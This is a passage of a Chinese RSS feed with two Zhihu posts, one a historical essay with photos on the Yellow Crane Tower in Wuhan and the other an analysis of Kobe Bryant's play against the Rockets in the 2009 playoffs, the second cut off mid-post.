data-rawwidth=\"612\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"《汉江揽胜图》另一仿品，作者佚名——我手头有《汉江揽胜图》原版影印本，与此图相似但诸多不同，总的印象是更为金碧辉煌一些，除此图武昌黄鹤楼半幅外，还有另外半幅汉阳晴川阁和汉口汉正街（原版藏于武汉市博物馆），因为不属于我（指影印件），就不方便拿到网上来——历史资料图片胡榴明藏品\" data-watermark=\"watermark\" data-original-src=\"v2-c549661201756069215e19660854d6bf\" data-watermark-src=\"v2-f4a99c9a250770021b21277203db1266\" data-private-watermark-src=\"v2-9a928c0c9ca9541454f9aa41cc112952\"></p>\n<p>古武昌城，沿市区周边筑一圈高而厚的城墙，东南西北，四方八面，九个城门，固若金汤，城内是官衙是学府是商埠是民居，城外是田地是田原是山岭是湖泊……</p>\n<p>武昌河街（今临江大道）沿长江岸延伸，四方生意，八方来客，三江五湖的船停泊江边码头，沿街店铺，门朝长江，背靠城墙，黄鹄矶在城墙内，黄鹤楼在山崖上。</p>\n<p>长江北岸汉阳古城，建城历史早于夏口，长江中游商业重镇，汉江入长江口自古以来军事商贸要冲，平常时日舟车行旅贸易繁忙。</p>\n<p>明嘉靖二十六年（1547年），汉阳知府范之箴主持修缮禹稷行宫（禹王庙）。东北侧长江边建晴川阁，楼阁正面与对岸黄鹤楼遥遥相对，因崔颢《登黄鹤楼》诗：“晴川历历汉阳树”立意得名。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e216b4b5654a015d22ebbb1b78a967ef_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"379\" data-size=\"normal\" data-caption=\"黄鹤楼隔江遥对晴川阁，因为崔颢的诗《黄鹤楼》。汉阳晴川阁明代建筑——资料图片\" data-watermark=\"watermark\" data-original-src=\"v2-e216b4b5654a015d22ebbb1b78a967ef\" data-watermark-src=\"v2-f10eba107eb809b2a48c76cd3a4d0b66\" data-private-watermark-src=\"v2-9753c4782a56b419b17c65d17fea3352\"></p>\n<p>明成化年（1487年），汉水改道，由龟山北注入长江，天长日久，沙泥淤积有了汉口。</p>\n<p>汉口，隔汉江与汉阳相对，隔长江与武昌相对，扼长江、汉水两大水道的咽喉，东西南北交汇要冲，舟车商旅经行往复，明中叶时，与河南朱仙镇、广东佛山镇、江西景德镇，并称中华“四大名镇”。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1fa4b0e7dae9c2711ad3ead9f833a2e1_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1920\" data-size=\"normal\" data-caption=\"历史上最后一座木建构黄鹤楼毁于1861年汉口开埠之后。图：汉口海关江汉关，武汉三镇从农耕时代进入工业时代的分界岭——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-1fa4b0e7dae9c2711ad3ead9f833a2e1\" data-watermark-src=\"v2-927e2ef65565f244fc659f61472435db\" data-private-watermark-src=\"v2-5407cebe204c6f6b882ef0d7390d4166\"></p>\n<p>《汉江揽胜图》，将武汉三镇尽收眼底。</p>\n<p>长江和汉江交汇，图左武昌古城，图右汉阳古城，那年鹦鹉洲还在长江中央，画作者站在汉江入江口汉口龙王庙高台上。</p>\n<p>武昌风景名胜黄鹤楼，汉阳风景名胜晴川阁，当年汉口年轻，没有名胜古迹（其实有晚清龙王庙，和黄鹤楼和晴川阁比年代不算古影响也不算大）。</p>\n<p>武昌西城门正对汉阳取名汉阳门，黄鹄矶位于汉阳门西南，画中黄鹤楼远远望去和清同治楼建筑式样没有区别。</p>\n<p>《汉江揽胜图》，意在气势，不在意技法，属山川地理图，不属山水风景图，看得出画家对图中山石草木没有兴趣，对江河流向城市建筑方位比较着意，技法依然虚实结合，例如想象自己站在龙王庙前长江边的高处观赏两江交汇百舸争流的风景，为后人留下清晚期武汉三镇进入现代化之前的历史痕迹。</p>\n<p>但是，和明代画家仇英扯不上关系。</p>\n<p>仇英，明弘治至明嘉靖人，年少时开始绘画，一生画作留传下来的很多，工水墨山水和青绿山水，其中山水建筑图多半云烟缭绕山石劲峭屋舍或精细或随意远处近处的林木几乎每一片叶子都是有生命的……</p>\n<p>五百年前的中国画，古风沉郁悠远几乎与世隔绝，后世人（指当时清晚期）模仿不来。</p>\n<h2>没有黄鹤楼的悠长岁月</h2>\n<p>清同治四年（1865年），湖广总督官文和湖北巡抚郭伯荫主持重建黄鹤楼，两年后建成，三层四望、翘角飞檐、八面攒尖顶，沿袭清代以来样式，虽然规模不能相比，人称同治楼。国运兴衰，楼阁兴衰。不一定应合准确，表达人们对天下太平、国家兴盛的期望。</p>\n<p>湖广总督官文，满洲正白旗人，武官出身，军功显赫，和平时期在武汉做了两件历史上必得书写的事：1861年和英国人协议“汉口开埠”，1868年主持重修战乱中被毁的黄鹤楼。</p>\n<p>可惜，天不遂人愿，十七年后，同治楼毁。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7f543ed91a52238812348efe258725e6_720w.jpg?rss\" data-rawwidth=\"610\" data-rawheight=\"551\" data-size=\"normal\" data-caption=\"同治黄鹤楼，当代新建黄鹤楼建筑样式摹本，比较宋代和明代清代早期黄鹤楼，同治黄鹤楼楼体及建筑群规模缩减，因为进入王朝衰败时期——历史资料照片\" data-watermark=\"watermark\" data-original-src=\"v2-7f543ed91a52238812348efe258725e6\" data-watermark-src=\"v2-0fcc2aadd2b5e8b682a3a78411629694\" data-private-watermark-src=\"v2-47cabeccba75b70b0aefeea11e7566c8\"></p>\n<p>清光绪十年（1884年）八月，武昌城墙根下一家店铺发生火灾，火焰窜出屋顶窜上黄鹄矶，当天北风肆虐（季风气候的长江中游，竟然盛夏起北风，天毁黄鹤楼也），江面空阔无阻挡，风助火势，长江南岸火光绵延，同治楼焚毁旦夕之间。</p>\n<p>中国建筑史最后一幢木构架古建筑黄鹤楼毁掉了。自后一百年，长江江畔黄鹄矶上残垣颓壁苍凉萧索——“落日江流带女墙,飞楼百尺俯苍茫”的意境，从今往后只能去古人诗画中找。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6356c5d4e99062bd7061a413deb64d89_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"720\" data-size=\"normal\" data-caption=\"在黄鹤楼公园抱冰堂给小学生讲武汉城市历史故事——摄影长江日报记者\" data-watermark=\"watermark\" data-original-src=\"v2-6356c5d4e99062bd7061a413deb64d89\" data-watermark-src=\"v2-fca28c035be709c8d8ebff85b7281fae\" data-private-watermark-src=\"v2-c7bc6e12574b2c5b25d921f2ba7475cd\"></p>\n<p>同治楼烧毁后，官方重建计划一再搁置。张之洞督鄂时期曾经说：假如（黄鹤楼）重建全部得用钢铁。当时他正在兴建汉阳钢铁厂。说归说，做归做，有没有钱是一回事，有没有心情是另一回事。城市建设，国计民生，古建筑复兴从来不在首位。 </p>\n<p>一百年间，没有黄鹤楼的武汉人怎么过？</p>\n<p>茶馆、酒楼、戏院，评书、大鼓、小曲、戏，《吕洞宾醉酒黄鹤楼》、《刘备醉走黄鹤楼》，戏剧故事，民间传说，真真假假不重要，图个乐而已。</p>\n<p>武汉人心里，黄鹤楼是一种荣耀，城市精神的寄托——尽管如此，和衣食住行的日常需要还是不一样的。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6e4e92da97600f7590f8d2e3cd3f7be1_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1920\" data-size=\"normal\" data-caption=\"汉口民众乐园，建于1919年，中国三大娱乐场之一——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-6e4e92da97600f7590f8d2e3cd3f7be1\" data-watermark-src=\"v2-52c6156223f9ee6ae02dd9b0ee966d96\" data-private-watermark-src=\"v2-876b8e9f357aa76bd9daafcc02ea3e2b\"></p>\n<p>清光绪三十年（1904年），湖广总督端方（短期兼职）在空空荡荡的黄鹄矶上自作主张建造一幢二层平顶西式建筑，竖一个砖砌瞭望高塔，武汉三镇没人喜欢，除了他自己。</p>\n<p>光绪三十三年（1907年），张之洞在北京升任内阁大学士兼军机大臣，湖北部属集资在黄鹄矶山坡兴建楼阁，主楼三层重檐歇山顶，附楼攒尖顶加歇山顶，风格、气势和前代黄鹤楼截然不同，先名风度楼（如战国蔺相如之虚怀若谷），张之洞更名奥略楼（谋略深远之意）并题写楼名。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9feac2ed21abce891fd7fdabe65014d0_720w.jpg?rss\" data-rawwidth=\"1714\" data-rawheight=\"1224\" data-size=\"normal\" data-caption=\"黄鹤楼古遗址清末奥略楼，注释见正文——非常感谢武汉地方志专家学者我的老师赠送图片资料影印件！朋友就是朋友！\" data-watermark=\"watermark\" data-original-src=\"v2-9feac2ed21abce891fd7fdabe65014d0\" data-watermark-src=\"v2-c71ea8776008c5fe43eba546b7eb7f91\" data-private-watermark-src=\"v2-3aa266a2412bb2578326a1fcf418ef6a\"></p>\n<p>随着时间流逝，渐渐后世人以奥略楼替代黄鹤楼，多数人真不知道，少数人知道装不知道。“昨天在武昌黄鹤楼和几个朋友聚”，“明天约好一起过武昌游黄鹤楼”……武汉三镇世代相传的黄鹤楼情结在没有黄鹤楼的一百年时光里有意无意执拗地坚持着。</p>\n<p>万里长江第一桥1957年建成，上层走人走汽车电车，下层走火车连通京广铁路，汉阳桥头架在龟山，武昌桥头架在蛇山，“天堑变通途”，武汉人好高兴！当年哪里顾得上毁掉不毁掉黄鹤楼旧址。任何时代，观赏美学从来都败给实用主义哲学。数十年后，兴奋心情渐渐平静下来，蓦然回首，天造地设的大自然馈赠，蛇山山头“千尺危崖”黄鹄矶已经不见了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-263b54d97ce8861d77b18b0d6a515c9f_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"683\" data-size=\"normal\" data-caption=\"长江一桥武昌桥头，图中桥头堡站立的位置就是当年蛇山头黄鹄矶。假想古黄鹤楼所在就是图中桥头堡所在。在这座桥头堡底下临街水泥墙上刻有几个字：古黄鹤楼旧址。古黄鹤楼之所以为天下名楼，其中之重要原因就是离长江太近，居高临下的江上风景——摄影胡西雷。\" data-watermark=\"watermark\" data-original-src=\"v2-263b54d97ce8861d77b18b0d6a515c9f\" data-watermark-src=\"v2-42d7e278c0dc5c4704ca1198330645d8\" data-private-watermark-src=\"v2-d767c16c4b47bffbedacf966f20345a6\"></p>\n<p>很多人惋惜，以为黄鹄矶上的黄鹤楼毁掉了，后来才弄清楚毁掉的是奥略楼和纯阳楼。</p>\n<p>其实人们“惋惜”错了——建筑毁掉可以再生（黄鹤楼古往今来毁掉兴起数十次），自然界（例如山和水）的毁掉，“再生”“重兴”就很难了。</p>\n<p>“古黄鹤楼旧址”几个字，很不显眼地刻在长江一桥武昌桥头临江大道靠山壁的那根钢筋水泥桥墩壁上，走过路过的人如果注意到可能会停下来看看，其实也没看出来个什么。</p>\n<p><b>新建黄鹤楼</b></p>\n<p>1985年，新建黄鹤楼重临长江之畔，坐落蛇山山顶，距离黄鹤楼旧址面对长江后退1000米，楼高五层，中式风格，西式结构，金碧辉煌，朱彩灿烂，特别是灯光勾勒的夜晚。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c89fc001b6575e62c13c00976180abd1_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1440\" data-size=\"normal\" data-caption=\"黄鹤楼广场——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-c89fc001b6575e62c13c00976180abd1\" data-watermark-src=\"v2-568d738fd001616cfc79d4547beaa952\" data-private-watermark-src=\"v2-d04ba87842c0019dc3b4813d8ac12cc6\"></p>\n<p>古今相比较，遗憾是肯定的：地理位置变了，古人诗词里的黄鹤楼风景多纬度视角效果绝对不会再有；时代空间变了，古人绘画中的黄鹤楼木柱木梁木架构纯中国古典绝对不会再有。每逢节假日游人堆山填海的今天，古风悠然的古黄鹤楼意境存在心里最好。</p>\n<p>古今相比较，骄傲是肯定的：今天黄鹤楼公园（黄鹤楼风景区）沿袭唐代起始楼阁建筑传统，主建筑群周边园林相互烘托，山石、花木、池塘、流水、亭阁、台榭、雕塑（包括巨型青铜雕塑世纪钟）……顺蛇山山脉一路往东绵延数公里，建造规模恢弘壮丽超过历史任何时期。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a3a652eea85631859ec6e7c78c30aa25_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"因为长江经过武汉三镇的流向（从西南往东北），历代黄鹤楼面临长江，正面楼体朝西。登高对岸两江交汇，汉江入江口江水奔腾。新建黄鹤楼楼上扁额书“黄鹤楼”三个大字，一楼匾额“气吞云梦”，曾经古云梦泽浩浩汤汤，从汉江上游一直覆盖长江中游——“气吞云梦”，对远古时空的怀念——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-a3a652eea85631859ec6e7c78c30aa25\" data-watermark-src=\"v2-820d63a4817ec1586bc69023e8797940\" data-private-watermark-src=\"v2-e3229328e94aedd0daa5461867264fad\"></p>\n<p>（完）2021.8.19</p>\n<hr>\n<p>附武汉黄鹤楼内外景观图——摄影胡榴明：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9e18283917aa304016587c3c8e56e1eb_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"气吞云梦，意思我正文解释了。书写者：赵朴初，中国佛教协会会长。年轻人多数不知道他，我们那一代人对他很熟悉。他的书法很漂亮！去年十月去长沙，长沙贾谊故居几个大字也是他的墨宝——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-9e18283917aa304016587c3c8e56e1eb\" data-watermark-src=\"v2-3e6e68fc2b022f77a9897ee522233548\" data-private-watermark-src=\"v2-40e91a3bd8ed41aa333b68cd29e05fc9\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-1c5fd0f6a2c007e126212a5b311a0e6a_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"黄鹤楼一楼大厅当代黄鹤楼模型。黑石板墙面刻唐·闫伯里《黄鹤楼记》。厅内立柱悬挂七米楹联——清代文人既民国书画家吴作人墨迹：“爽气西来，云雾扫开天地憾；大江东去，波涛洗尽古今愁！”——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-1c5fd0f6a2c007e126212a5b311a0e6a\" data-watermark-src=\"v2-c9f2d963655ed41053120520307507c8\" data-private-watermark-src=\"v2-fd9090e93815fac2874dd00276ed87e2\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-2064cc7e5b69dd204c3c72bbe4aca4ce_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"照片拍了好几年，忘了是黄鹤楼第几层了，墙面汉白玉刻绘，玻璃罩子里可能是只银制香炉，木雕长椅也是工艺品——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-2064cc7e5b69dd204c3c72bbe4aca4ce\" data-watermark-src=\"v2-73ccacc5134c34600c6e67788f35142b\" data-private-watermark-src=\"v2-91c7a319cab24a99573ac58e44c0a0e1\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-2192198ab6946a51b78dbd34f0d43cd7_720w.jpg?rss\" data-rawwidth=\"768\" data-rawheight=\"1024\" data-size=\"normal\" data-caption=\"黄鹤楼公园世纪钟，建于2000年。图片上看不觉得什么，走近前看非常巨大。作为一个世纪之交的亲历者，站在那里，很感动——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-2192198ab6946a51b78dbd34f0d43cd7\" data-watermark-src=\"v2-67c244b7e32027d87eaa5d32950d0517\" data-private-watermark-src=\"v2-8904cceb4b321d2c0cb37372ef802b29\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-ef7b9f5e4c39c76f1d970f1ae6c3fa08_720w.jpg?rss\" data-rawwidth=\"640\" data-rawheight=\"596\" data-size=\"normal\" data-caption=\"明末青绿山水画家仇英的画。特地从网上找来放在这里给喜欢的人看看。前年去年《黄鹤楼》一文写作，为了鉴别《汉江揽胜图》到底是不是仇英的作品，我花了一些时间。说明一点：要想成为一个好的历史文化散文作家，很多知识非得了解一点不可，不然写不出好文章——当然我也不能说我的文章写得好——网络图片\" data-watermark=\"watermark\" data-original-src=\"v2-ef7b9f5e4c39c76f1d970f1ae6c3fa08\" data-watermark-src=\"v2-ff64e7b1aa54f09b87889fb7b607f390\" data-private-watermark-src=\"v2-0f6d4c3f273da68eb909225dcce307df\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-af6eaeabc6ec0290a2f77fdcaf49c237_720w.jpg?rss\" data-rawwidth=\"725\" data-rawheight=\"493\" data-size=\"normal\" data-caption=\"前几年应黄鹤楼景区和长江日报邀请，和几位诗人朋友去黄鹤楼参加一个黄鹤楼诗画活动——摄影黄鹤楼公园\" data-watermark=\"watermark\" data-original-src=\"v2-af6eaeabc6ec0290a2f77fdcaf49c237\" data-watermark-src=\"v2-116412f291b5ec5b407076b62791428b\" data-private-watermark-src=\"v2-a06a9787307cca7caf57fe7264b9a017\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-dde5062dfd782ee06b71883d941e0b32_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"黄鹤楼公园新开放景区抱冰堂·张之洞纪念馆——湖广总督张之洞调任北京，湖北新军军官集资修此堂纪念。张之洞平时自称“抱冰老人”，取《吴越春秋》越王勾践“冬常抱冰、夏常握火”一句——堂馆建筑素雅简朴，山静寂，树丰茂——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-dde5062dfd782ee06b71883d941e0b32\" data-watermark-src=\"v2-bf780bbc4d1b399965090c10e6fd130b\" data-private-watermark-src=\"v2-187aa3a5ee22191e028386fc049fc42c\"></p>\n<p>先到这里吧，以后再补充。</p>\n<p>2021.8.19.3:53</p>\n<p><br></p>\n<p><br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ye-li-ge-52?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">胡榴明</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/463692637/answer/2066224265?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">14 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/337570929?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">去湖北武汉的「黄鹤楼」有哪些实用的攻略和好的建议？</a><br><a href=\"http://www.zhihu.com/question/64528631?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">武汉户部巷附近有什么好吃的吗？</a><br>\n","link":"http://www.zhihu.com/question/463692637/answer/2066224265?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"记忆中，最体现科比特质的一场比赛","date":"2021-08-26 03:53:18","description":"\n<p>以前聊到过：</p>\n<p>我觉得，最体现科比个人特质的比赛，不是81分、三节62分、34分钟56分、四连50分之类。</p>\n<p>而是2009年西部半决赛湖人对火箭之战，第二场。</p>\n<hr>\n<p>皮尔斯曾经比较科比、麦蒂、卡特、甜瓜、勒布朗。</p>\n<p>麦蒂是小前锋身材里的组织后卫，投篮起跳点高到你盖不到，所以你总得琢磨别让他进入投篮位置。</p>\n<p>卡特是投篮起跳很快，同时第一步惊人，所以特别需要在意防守的尺寸。</p>\n<p>勒布朗壮而又快，而且一个肩膀就能卡到身位，而且左右手全能，不停的身体接触也让你疲倦。你可以尝试让他跳投。</p>\n<p>甜瓜是个独特的家伙，又壮，又能投，而且袭篮的步伐很好，而且在任何点都能投篮。这让他难以取舍。</p>\n<p>针对科比，皮尔斯没说某个单项。他说科比的可怕是：他会无休止地反复来搞你，从一切可能的角度，用一切可能的方式来搞你。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>巴图姆刚去开拓者时，麦克米兰教练简单告诫他：</p>\n<p>防麦蒂？防他强投；防勒布朗？限制他突破。</p>\n<p>防科比？“祝你好运。”</p>\n<hr>\n<p>2009年西部半决赛第一场，姚明的光荣之战。众所周知，在斯台普斯球馆，姚明面对湖人三塔包围，28分10篮板，最后带伤归来终结比赛。</p>\n<p>那场火箭的另一个隐藏英雄是巴蒂尔：科比得了32分，但用了31发投篮。</p>\n<p>其中对位巴蒂尔时，22投8中。</p>\n<p>巴蒂尔尽量将科比左手突破，陷入夹击陷阱，不让科比进罚球线，用遮脸防守干扰科比的视线，尽量让科比投长距离的跳投。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-2d676250b3338aa2454acd1349bfb9d7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"608\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-2d676250b3338aa2454acd1349bfb9d7_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>我们都知道，巴蒂尔是个完美的头脑型防守专家。他的身体天赋不过中人之资。研究对手，解读对手的偏好。比赛中，他逼迫对手往协防陷阱里走，让对手投篮时面前总有只手在。在对手外围活动时阻断传球线路，逼迫对手到不舒服的地方接球。他的身体接触，是当对手到内线时才进行的。因此，他的打法总是很干净。在长达48分钟的比赛里，巴蒂尔是NBA最好的粘防者之一。他将防守当作一门科学来解剖。他基本不会犯错。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>于是来到第二场。</p>\n<hr>\n<p>开场第一球，科比右翼要位，巴蒂尔伸手阻绝球。</p>\n<p>奥多姆给球左侧鱼主席，鱼主席给左翼阿里扎，巴蒂尔侧头看着阿里扎。</p>\n<p>就在巴蒂尔侧头瞬间，科比突然启动，巴蒂尔慢了一步；姚明横移，挡科比突破路线，巴蒂尔跟随。</p>\n<p>但科比没想突破内线：一个小跳步接球，起手直接跳投。</p>\n<p>姚明的补位提前到了，巴蒂尔的跟防并无问题，甚至也手遮眼了。科比接球起跳时两脚尖还朝左。</p>\n<p>在极小的缝隙中，科比滞空调整，抬右脚维持平衡，出手：得手了。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-02c4d48f79cf7b73f0348e14bcc899e7_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-thumbnail=\"https://pic4.zhimg.com/v2-02c4d48f79cf7b73f0348e14bcc899e7_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"512\" data-original=\"https://pic4.zhimg.com/v2-02c4d48f79cf7b73f0348e14bcc899e7_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>之后，是一模一样的右翼横移罚球线拿球：巴蒂尔这次跟到了科比的无球走，放科比走左手，预备他左手突破。</p>\n<p>科比坚持走右手，但没突。一个大幅度横移，直接跳投得手。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>湖人推反击，奥多姆给科比掩护，方便科比左手突破中路。</p>\n<p>然而科比直接变速，右手突破底线，一口气穿过巴蒂尔、慈世平和姚明，左手上篮。</p>\n<p>他这一下不等湖人落位，直接变速突破，巴蒂尔和慈世平都没想到，尤其慈世平转胯时，明显预备不足。</p>\n<p>姚明本来面向正面等加索尔要位，但他反应够快，横移、跳步、封盖，但差了一点。</p>\n<p>科比正面上篮用左手并不多，这一下的意思：</p>\n<p>加速突破时左肩更接近篮筐，左手上篮，能越过身后补来的姚明。</p>\n<p>这一下，进攻的时机、方向、角度选择和细节，都有了。一下将巴蒂尔、慈世平和姚明给串了。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-2a209b4fffca966931bc8bd3fd3b3ee3_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-thumbnail=\"https://pic4.zhimg.com/v2-2a209b4fffca966931bc8bd3fd3b3ee3_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"512\" data-original=\"https://pic4.zhimg.com/v2-2a209b4fffca966931bc8bd3fd3b3ee3_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>巴蒂尔放科比左手，科比这次左手突破一步，急停小跳步，迎着巴蒂尔遮眼强投。</p>\n<p>5投4中，独得8分，湖人16比8领先，打停火箭。</p>\n<p>即，这场比赛，是科比开场左右开弓，无球走、持球急停、持球右突、左突急停跳投。</p>\n<p>四种打法，一个人打晕了火箭。<br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-bd93c257e68cb8f5b963378981c30297_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"874\" data-rawheight=\"546\" class=\"origin_image zh-lightbox-thumb\" width=\"874\" data-original=\"https://pic4.zhimg.com/v2-bd93c257e68cb8f5b963378981c30297_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>科比叫加索尔挡拆，左手突破。</p>\n<p>巴蒂尔和姚明的方略是：逼科比左手突破，然后夹击。</p>\n<p>科比这一下属于自投罗网，但他有预备了：收球起那一下，就是按着急停跳投的步子走的。</p>\n<p>比平时更高的起跳，更大的倾斜幅度（所以落地向左退了），更高的出手点。</p>\n<p>在姚明和巴蒂尔夹击之下，得手。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-ea21353f7b35e1bd8fe5a63030c00664_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-thumbnail=\"https://pic1.zhimg.com/v2-ea21353f7b35e1bd8fe5a63030c00664_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"512\" data-original=\"https://pic1.zhimg.com/v2-ea21353f7b35e1bd8fe5a63030c00664_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>随后，追身投巴蒂尔一个遮眼三分球，湖人29比16领先，科比自己13分。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>火箭换了慈世平来防，科比叫个掩护，面对海耶斯，招牌的起跳后扭身后仰踢右腿保持平衡投篮，压哨得手，第一节39比25。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-09909923caffd1b202888ce097fedd77_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-thumbnail=\"https://pic4.zhimg.com/v2-09909923caffd1b202888ce097fedd77_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"512\" data-original=\"https://pic4.zhimg.com/v2-09909923caffd1b202888ce097fedd77_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>第二节火箭打出32比15的高潮一度反超3分。</p>\n<p>半场结束前8秒，科比右翼接球，一个横摇牵住巴蒂尔重心，直接迎着巴蒂尔一个三分球。57平进入下半场。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>下半场，科比右翼接球，若有若无的摇球右腰，一个右试探步。</p>\n<p>立刻连交叉步，左手突破。</p>\n<p>这一下左→右→左的重心摇摆，巴蒂尔也被晃了一步；科比直扑罚球线，巴蒂尔转胯跟随，架左手想挡科比变线突破，重心下沉，科比已经急停跳投，出手点比平时高。巴蒂尔阻挡但慢了一步，犯规被打三分。</p>\n<p>巴蒂尔每一步防守都是对的，但就是没防住。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-67842197f7d6478bc943b37a732c89bd_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-thumbnail=\"https://pic2.zhimg.com/v2-67842197f7d6478bc943b37a732c89bd_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"512\" data-original=\"https://pic2.zhimg.com/v2-67842197f7d6478bc943b37a732c89bd_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>科比左翼接球，连续胯下运球后低重心右手突破中路，急停起手中投。</p>\n<p>巴蒂尔放弃遮眼了，直接干扰投篮。</p>\n<p>而科比出手时，右手有稍微调整角度伸直手臂，以躲过巴蒂尔的追盖。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img 